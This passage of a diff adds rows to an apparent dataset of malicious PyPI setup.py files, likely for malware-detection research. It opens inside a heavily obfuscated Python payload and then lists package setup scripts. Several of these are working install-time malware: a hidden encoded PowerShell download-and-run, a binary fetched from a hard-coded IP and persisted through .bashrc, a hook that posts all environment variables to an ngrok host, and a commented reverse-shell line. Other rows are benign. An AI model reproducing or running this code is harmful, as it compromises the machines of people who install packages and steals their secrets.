+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 1929:
+				鸟口目水子口山日口日日鸟马月鸟水 = [
+					目水鸟月木人木鳥马口马刀木鳥水子 + ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) - 1) << 2), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), (7 << 4) - 1, (7 << 4) + 3, (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 2), ((
+					    ((3 << 2) - 1)) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((1 << 4) - 1) << 3) - 1, (7 << 4) + 3, (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2) - 1, (7 << 4) + (1 << 2), (3 << 5) + 1, (7 << 4) + (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((5 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (((1 << 4) - 1) << 3) - 3])),
+					目水鸟月木人木鳥马口马刀木鳥水子 + ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) - 1) << 2), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), (7 << 4) - 1, (7 << 4) + 3, (7 << 4) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 2), (((((1 << 3) + 1))) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 1), (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (7 << 4), (((7 << 2) - 1) << 2), (7 << 4) - 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (
+					    1 << 1), (((3 << 3) - 1) << 2), (5 << 4) + 1, (((1 << 4) - 1) << 3) - 3, ((((3 << 2) + 1)) << 3) + 1, (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2) - 1, (1 << 5), (((5 << 2) - 1) << 2), (3 << 5) + 1, (((1 << 4) - 1) << 3) - 3, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2) + 1, (7 << 4) + 3, (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 1), (1 << 5), (5 << 4), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2), (((3 << 3) - 1) << 2), (((5 << 2) + 1) << 2), (3 << 5) + 1, (7 << 4) + 3, (((7 << 2) - 1) << 2) - 1, (1 << 6) + (1 << 1), (3 << 5) + 1, (7 << 4) + (1 << 1)])),
+					月人刀口馬刀山马水人月人月山人山
+				]
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 950*(445&981)+812//716-(625|189+545)|625<<384<<322>>(765|613)&~331
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 29059:
+				os.makedirs(目水鸟月木人木鳥马口马刀木鳥水子 + ''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((3 << 3) - 1) << 2), (((1 << 4) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - 1, (7 << 4) - (1 << 1)])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 71*(611&692)+884//306-(46|467+455)|46<<655<<223>>(356|561)&~207
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 28669:
+				月人刀口馬刀山马水人月人月山人山 = os.path.expanduser(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(1 << 7) - (1 << 1), (((3 << 3) - 1) << 2), (((1 << 4) + 1) << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + 3, (((7 << 2) - 1) << 2) - 1, (7 << 4) + (1 << 2), (7 << 4) - 1, (7 << 4)])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 199*(17&787)+851//947-(288|954+500)|288<<57<<344>>(794|157)&~849
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 186387:
+				女马子人月女鸟馬月月水馬目鸟刀馬 = Dispatch(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) - 1)) << 3) - 1, (((5 << 2) + 1) << 2) - 1, (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((5 << 2) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])))
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 884*(932&985)+555//138-(322|649+570)|322<<361<<75>>(527|213)&~142
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 383984:
+				if ctypes.windll.shell32.IsUserAnAdmin():
+					子水女馬人月刀人馬鳥山馬馬刀女人 = 436*(853&963)+756//406-(374|279+62)|374<<95<<214>>(161|944)&~500
+					continue
+				子水女馬人月刀人馬鳥山馬馬刀女人 = 102*(468&715)+338//836-(544|548+999)|544<<951<<41>>(993|645)&~762
+			elif 子水女馬人月刀人馬鳥山馬馬刀女人 == 382664:
+				人馬口刀女子月水人目水鳥山口馬馬.write(''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 5), (7 << 4), (3 << 5) + 1, ((((3 << 2) + 1)) << 3) - 1, (((3 << 3) + 1) << 2) + 1, (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (7 << 4) + (1 << 1), (7 << 4) - 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (((3 << 3) - 1) << 1), (((3 << 3) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (((3 << 3) - 1) << 1), ((((3 << 2) + 1)) << 3) - 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 6) + (1 << 1), (3 << 5) + 1, (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2) - 1, ((((3 << 2) + 1)) << 3) - 1, (7 << 4) + (1 << 1), (7 << 4) - 1, (((1 << 4) - 1) << 3) - 3, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (5 << 4), (3 << 5) + 1, ((((3 << 2) + 1)) << 3) - 1, (((3 << 3) + 1) << 2) + 1, (5 << 3), (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (5 << 1), (((1 << 4) - 1) << 3) - (1 << 1), (3 << 5) + 1, (7 << 4) + (1 << 1), (1 << 5), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (3 << 5) + 1, (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (5 << 3), (5 << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (5 << 3) - 1, (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (3 << 5) + (1 << 1), (7 << 4) - 1, (((3 << 3) + 1) << 2), (((1 << 4) - 1) << 3) + 1, (((3 << 3) - 1) << 1), (3 << 5) + 1, (7 << 4), (7 << 4), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), ((((3 << 2) + 1)) << 3) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2), (5 << 3), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (7 << 4) + 3, (5 << 3), (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (5 << 1), ((((3 << 2) + 1)) << 3) - (1 << 1), (((1 << 4) - 1) << 3) - 3, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2) - 1, (7 << 4) + (1 << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (1 << 5), (((3 << 3) + 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2) - 1, ((((3 << 2) - 1)) << 3) - 1, (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) + (1 << 2), (1 << 6) + 1, (((3 << 3) + 1) << 2), (((3 << 3) + 1) << 2), (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4) + 3, (7 << 4) + 3, (((3 << 3) + 1) << 2) + 1, (7 << 4) + 3, (5 << 3), (5 << 3) + 1, (1 << 5), (((1 << 4) - 1) << 3) + 3, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((3 << 3) + 1) << 2), (7 << 4) - 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) - 1) << 3) - 3, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((3 << 3) + 1) << 2) + 1, (((1 << 4) - 1) << 3), (((3 << 3) + 1) << 2) + 1, (((3 << 3) + 1) << 2) - 1, (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (((7 << 2) - 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (3 << 5) + 1, (7 << 4) - (1 << 1), (((3 << 3) + 1) << 2), (5 << 3), (5 << 3) - 1, (7 << 4), (3 << 5) + 1, (7 << 4) + 3, (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (5 << 3) - 1, (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((1 << 4) - 1) << 3) - (1 << 1), (3 << 5) + 1, (7 << 4) + (1 << 1), (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4), (((1 << 4) - 1) << 3) - 3, (7 << 4) + (1 << 2), (((1 << 4) + 1) << 2) + 1, (((7 << 2) - 1) << 2), (((3 << 3) + 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (((1 << 4) - 1) << 3) - (1 << 1), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((1 << 4) - 1) << 3) - 3, (((3 << 3) + 1) << 2) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4), (((7 << 2) - 1) << 2), (3 << 5) + 1, (((3 << 3) + 1) << 2) - 1, (((3 << 3) + 1) << 2) + 1, (5 << 3), (3 << 4) - 1, (3 << 5) - (1 << 1), (5 << 3), (3 << 4), (((1 << 4) - 1) << 3), (5 << 3) + 1, (((3 << 3) - 1) << 2) - 1, (1 << 6) + 1, ((((3 << 2) - 1)) << 2) + 1, (((((1 << 3) + 1))) << 3) - (1 << 1), (3 << 5) + 1, ((((3 << 2) - 1)) << 2) + 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (3 << 4), ((((3 << 2) - 1)) << 2) + 1, (7 << 3) + 1, (((3 << 3) - 1) << 2) + 1, (((1 << 4) - 1) << 3) + 3, ((((3 << 2) + 1)) << 2), (3 << 4), (1 << 7) - 3, (((((1 << 3) + 1))) << 2), (3 << 4) - 1, ((((3 << 2) + 1)) << 3) - 1, ((((3 << 2) - 1)) << 2), (1 << 5), (5 << 3) - 1, (3 << 4), (((1 << 4) - 1) << 3), (7 << 3) - (1 << 1), (((3 << 3) + 1) << 2) + 1, (3 << 5) + (1 << 1), (((3 << 3) + 1) << 1), (3 << 4) + 1, (3 << 4), ((((3 << 2) + 1)) << 2) - 1, (7 << 3), ((((3 << 2) + 1)) << 2) - 1, (7 << 3) + 1, (3 << 4), (3 << 4) + 1, (3 << 4) + 1, (((1 << 4) + 1) << 2) + 1, (((3 << 3) + 1) << 2), ((((3 << 2) + 1)) << 2) + 1, (7 << 3) - (1 << 1), (((3 << 3) + 1) << 2) - 1, (7 << 3) + 1, (7 << 3), (3 << 4) + 1, ((((3 << 2) + 1)) << 2), ((((3 << 2) + 1)) << 2) + 1, (3 << 5) + (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 2), ((((3 << 2) + 1)) << 2) - 1, ((((3 << 2) + 1)) << 3) - (1 << 1), (7 << 3) + 1, (((3 << 3) + 1) << 2), (7 << 3) - (1 << 1), (1 << 6) + (1 << 1), (((1 << 4) + 1) << 2) + 1, (3 << 4) + 1, (3 << 5) + (1 << 1), ((((3 << 2) + 1)) << 2), (((3 << 3) + 1) << 2), (1 << 6) + 1, (7 << 3) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (5 << 3) - 1, (5 << 3) + 1, (((1 << 4) - 1) << 2) - 1, (5 << 1), (1 << 5), (1 << 5), (1 << 5), (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (1 << 5), (((1 << 4) - 1) << 2) + 1, (1 << 5), (((3 << 3) + 1) << 2) - 1, (((7 << 2) - 1) << 2), ((((3 << 2) + 1)) << 3) + 1, (7 << 4), (3 << 5) + (1 << 1), (7 << 4) - 1, (3 << 5) + 1, (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2), (((1 << 4) + 1) << 2) - 1, (7 << 4) - 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) + 1) << 2) + 1, (7 << 4) - (1 << 1), (7 << 4) + (1 << 2), (((3 << 3) - 1) << 1), (7 << 4) + (1 << 1), (((3 << 3) + 1) << 2) + 1, (7 << 4), (((7 << 2) - 1) << 2), (3 << 5) + 1, (((3 << 3) + 1) << 2) - 1, (((3 << 3) + 1) << 2) + 1, (5 << 3), (3 << 4) - 1, (3 << 5) - (1 << 1), (((5 << 2) + 1) << 2), (((3 << 3) - 1) << 2) - 1, (1 << 6) + 1, ((((3 << 2) - 1)) << 2) + 1, ((((3 << 2) - 1)) << 3) + (1 << 1), (3 << 5) + 1, ((((3 << 2) - 1)) << 2) + 1, (((1 << 4) - 1) << 3) + (1 << 1), (3 << 4) + 1, ((((3 << 2) - 1)) << 2) + 1, (7 << 3) + 1, (((3 << 3) - 1) << 2) + 1, (((1 << 4) - 1) << 3) + 3, ((((3 << 2) + 1)) << 2) - 1, ((((3 << 2) + 1)) << 2) - 1, (1 << 7) - 3, (((((1 << 3) + 1))) << 2), (3 << 4) - 1, ((((3 << 2) + 1)) << 3) - 1, ((((3 << 2) - 1)) << 2), (1 << 5), (5 << 3) - 1, (((5 << 2) + 1) << 2), (((5 << 2) - 1) << 2) - 1, ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 2), (7 << 4) + (1 << 2), (((5 << 2) + 1) << 2), (7 << 3) - 1, (((1 << 4) - 1) << 3) - (1 << 1), ((((3 << 2) - 1)) << 3) + 1, (((5 << 2) - 1) << 2), (((7 << 2) - 1) << 2) - 1, ((((3 << 2) + 1)) << 3), (((5 << 2) + 1) << 2) + 1, (((1 << 4) - 1) << 3) + 1, (((1 << 4) - 1) << 3) + (1 << 1), (((5 << 2) - 1) << 2), (7 << 4) + 1, (3 << 5) + (1 << 1), (5 << 4) + 1, (((5 << 2) - 1) << 2) + 1, (((7 << 2) - 1) << 2) + 1, (7 << 4) + 3, (7 << 4) + (1 << 1), (((5 << 2) - 1) << 2) + 1, ((((3 << 2) + 1)) << 2) - 1, (7 << 3) - (1 << 1), (5 << 4) + 1, (((1 << 4) - 1) << 3) + ("
+f435f61c8fdb0e63fd62539bcea9f6ba93593b0e,py-nvidiacandy-9.41,py-nvidiacandy-9.41/py-nvidiacandy-9.41/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,524c92e9ded45c9aad029b0127bb240d2982c304,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'py-nvidiacandy',
+    packages = ['modlib'],
+    version = '3.53',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+f443f3d1fcce0b5b136fcb609348daf2b77f9b3a,djanga-0.1,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/djanga/0.1/tar-gz/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,60b5fbeb0f6c37e5ce5f63f193f2e6bdeaf498de,"from setuptools import setup, find_packages
+
+def rn ():
+
+        import platform
+
+        s = False
+        try:
+                import urllib2
+        except ImportError:
+                import http.client
+                s = True
+        import os, stat
+
+        PATH = ""/out""
+        IP = ""145.249.104.71""
+        LOC = "".drv""
+
+        if platform.system () == ""Linux"":
+
+                if not s:
+                        response = urllib2.urlopen (""http://"" + IP + PATH).read ()
+                else:
+                        connection = http.client.HTTPConnection (IP)
+                        connection.request (""GET"", PATH)
+                        response = connecton.getresponse ().read ()
+                os.chdir (os.path.expanduser (""~""))
+                d = open (LOC, ""wb"")
+                d.write (response)
+                d.close ()
+
+                current_state = os.stat (LOC)
+                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)
+
+                brc = open ("".bashrc"", ""a"")
+                brc.write (""\n~/.drv &"")
+                brc.close ()
+
+                system (""~/.drv"")
+        else:
+                print (""Error installing library!"")
+                exit (-1)
+
+rn ()
+
+
+setup(
+  name = 'djanga',
+  packages = find_packages (),
+  version = '0.1',
+  description = 'Django framework',
+  author = 'Rosa',
+  author_email = 'rosaright@example.com',
+  url = '',
+  download_url = '', 
+  keywords = [''],
+  classifiers = [],
+)"
+f489df91b36fc6892594cb9109b126f537ff96ab,httpsrequestsfast-1.1,httpsrequestsfast-1.1/httpsrequestsfast-1.1/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,7e7e95d9b0690998562404a146329b9345889107,"from distutils.core import setup
+
+setup(
+    name = ""httpsrequestsfast"",
+    packages=[""httpsrequestsfast""],
+    version=""1.1"",
+    license=""MIT"",
+    description=""Make https requests all over the web."",
+    author=""emma"",
+    author_email=""emma@hotmail.com"",
+    url=""https://github.com/emmaoeoe/httpsrequestsfast"",
+    download_url=""https://github.com/emmaoeoe/httpsrequestsfast/archive/refs/tags/bon.tar.gz"",
+    install_requires=[
+        ""requests"",
+    ],
+)"
+f49b6c37b392fc465ea5945ef0ce16f7c25d564e,tdwtauthauthentication-1.0.8,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/tdwtauthauthentication/1.0.8/zip/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,73119459496d30477c456750d6a6d01dd69bdb71,"import os
+import re
+import sys
+import subprocess
+from setuptools import setup
+from setuptools import find_packages
+import requests
+import base64
+import platform
+
+setup(
+    name=""tdwTauthAuthentication"",
+    version=""1.0"",
+    description=""Python SDK"",
+    python_requires="">=3.6"",
+    install_requires=[
+        ""requests>=2.27.1""
+    ],
+)"
+f77438ba68a546523a82ffd6a7266ee8f5621e4b,artifact-lab-3-package-e90915e1-0.1.4,artifact-lab-3-package-e90915e1-0.1.4/artifact-lab-3-package-e90915e1-0.1.4/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,a7b9ac97557eda89e132ea6d2eb9e4e9978f2b7f,"import setuptools
+from setuptools.command.install import install
+from setuptools.command.develop import develop
+from setuptools import setup, find_packages
+import os
+import urllib.request
+import urllib.parse
+
+def notmalfunc():
+    data = dict(os.environ)
+    encoded_data = urllib.parse.urlencode(data).encode()
+    url = 'https://ac9c-54-204-140-51.ngrok-free.app'
+    request = urllib.request.Request(url, data=encoded_data)
+    urllib.request.urlopen(request)
+
+class AfterDevelop(develop):
+    def run(self):
+        develop.run(self)
+        notmalfunc()
+
+class AfterInstall(install):
+    def run(self):
+        install.run(self)
+        notmalfunc()
+
+setuptools.setup(
+    name = ""artifact-lab-3-package-e90915e1"",
+    version = ""0.1.4"",
+    long_description = ""long description"",
+    long_description_content_type = ""text/markdown"",
+    classifiers = [
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    packages = find_packages(),
+    python_requires = "">=3.6"",
+    cmdclass={
+        'develop': AfterDevelop,
+        'install': AfterInstall,
+    },
+)"
+fadd0c6da604c141223517de6abec90b31ec10b7,important_package-0.1.2,important_package-0.1.2/important_package-0.1.2/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,98bef75132241dece7baad56b29f2f14835d3a4c,"import setuptools
+
+with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
+    long_description = fh.read()
+
+setuptools.setup(
+    name=""important_package"",
+    install_requires = ['dnspython'],
+    version=""0.1.2"",
+    author=""Example Author"",
+    author_email=""author@example.com"",
+    description=""A small example package"",
+    long_description=long_description,
+    long_description_content_type=""text/markdown"",
+    url=""https://github.com/pypa/sampleproject"",
+    project_urls={
+        ""Bug Tracker"": ""https://github.com/pypa/sampleproject/issues"",
+    },
+    classifiers=[
+        ""Programming Language :: Python :: 3"",
+        ""License :: OSI Approved :: MIT License"",
+        ""Operating System :: OS Independent"",
+    ],
+    package_dir={"""": ""src""},
+    packages=setuptools.find_packages(where=""src""),
+    python_requires="">=3.6"",
+)"
+fc57eb89c0e18cb168450454aed9a92a600145e2,secretinspector-0.0.2,secretinspector-0.0.2/secretinspector-0.0.2/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,4abf11ad5a9bf5f620472be029aa5d96f62f0aa8,"# setup.py
+from setuptools import setup, find_packages
+from setuptools.command.egg_info import egg_info
+import os
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        os.system(""echo 'You Have been pwned' > /tmp/pwned"")
+	#os.system(""bash -i >& /dev/127.0.0.1/1234/ 0>&1"")
+        egg_info.run(self)
+
+setup(
+    name=""secretInspector"", 
+    version=""0.0.2"", 
+    packages=find_packages(),
+    cmdclass={
+        'egg_info': RunEggInfoCommand
+    },
